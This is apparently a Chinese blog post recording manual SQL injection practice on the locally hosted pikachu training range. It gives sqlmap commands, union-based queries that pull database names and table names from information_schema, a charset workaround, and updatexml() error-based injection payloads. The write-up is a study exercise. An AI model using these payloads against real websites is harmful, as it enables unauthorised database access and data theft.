---
title: "pikachu 靶场：SQL 注入手搓记录"
date: 2026-11-05 20:23:00
tags: [SQL注入, pikachu, sqlmap, 靶场]
categories: [漏洞挖掘]
cover: /images/pikachu-sqli/image1.png
description: "数字型注入、union 联合查询、字符集报错与 updatexml 报错注入的完整手搓过程。"
---

> 虽然用 sqlmap 自动化扫描很爽，但还是要学习如何手搓（因为实力原因，可能有误，欢迎指正）。本文为授权靶场练习记录，所有操作仅在本地搭建的 pikachu 靶场中进行。

## 零、sqlmap 语法备查

```bash
sqlmap -u "完整url" --batch
sqlmap -u "完整url" --dump --batch
```

- `--batch`：自动选择系统默认选项
- `--dump`：自动注入
- `-r`：接文件（HTTP 请求文件）
- 若扫描时看到 `vulnerable` 就代表有漏洞

## 一、数字型注入

数字型注入：只能选择数字（结合 BP 进行抓包），且 URL 不完整（反正我没找到）。

注入流程：从 `id=1`（正常）开始：

```sql
id=1 and 1=1     -- 正常
id=1 and 1=2     -- 报错
id=2'            -- 报错
```

这里本来会有报错回显，但因为兼容性就没有显示（就当盲注打了）。

![注入点测试回显](/images/pikachu-sqli/image1.png)

接着 `id=1 order by 2`（正常增加右边数字直到报错，确定字段数）。

然后 `id=-1 union select 1,2`：`-1` 让前面查不到位置，然后看 1、2 确定回显位置。构造 `id=-1 union select database(),version()` 发送后返回：

![确定回显位置与数据库信息](/images/pikachu-sqli/image2.png)

## 二、爆表名与兼容性坑

接着：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
```

下面是解释：

- `group_concat(table_name)`：聚合函数带出所有表名
- `information_schema.tables`：MySQL 系统元数据库
- `table_schema`：包含所有表名

![爆表名时的报错](/images/pikachu-sqli/image3.png)

然后就报错了（可恶的兼容性害我卡了好久，报错都没有）。

神奇的是我直接爆字段又没有报错哦。当然用 `hex()` 包住 `group_concat(table_name)` 就行了，绕过一下。

这是因为字符集与排序规则冲突（不是黑名单，没那么难）。

![字符集冲突的报错信息](/images/pikachu-sqli/image4.png)

这里用 `convert()` 直接出：

![用 convert 绕过字符集冲突](/images/pikachu-sqli/image5.png)

然后字段名，建议不要一下子全爆出来（因为返回的是哈希值贼难看）。

![爆出的字段名与数据](/images/pikachu-sqli/image6.png)

最后就到这。

## 三、insert / update 报错注入

前面的四个靶场都差不多思路，接下来 insert/update 注入则是通过报错回显，使用函数 `updatexml()`。

在这之前试探过登录界面，有 `escape()` 转义：

```sql
x' or updatexml(1,concat(0x7e,database()),1) or '1'='1
```

![updatexml 报错回显数据库名](/images/pikachu-sqli/image7.png)

继续爆表名：

```sql
x' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or '1'='1
```

![报错注入爆表名](/images/pikachu-sqli/image8.png)

发现字符数量限制用 `limit`：

```sql
x' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) or '1'='1
```

改 `limit` 右边第一个数即可逐条取。

## 四、小结

了解原理后直接 sqlmap 吧。手搓的价值不在跑出结果，而是知道每一段 payload 在数据库里到底做了什么——尤其是遇到报错时，能分清是**语法问题**、**字符集冲突**，还是真的被过滤了。
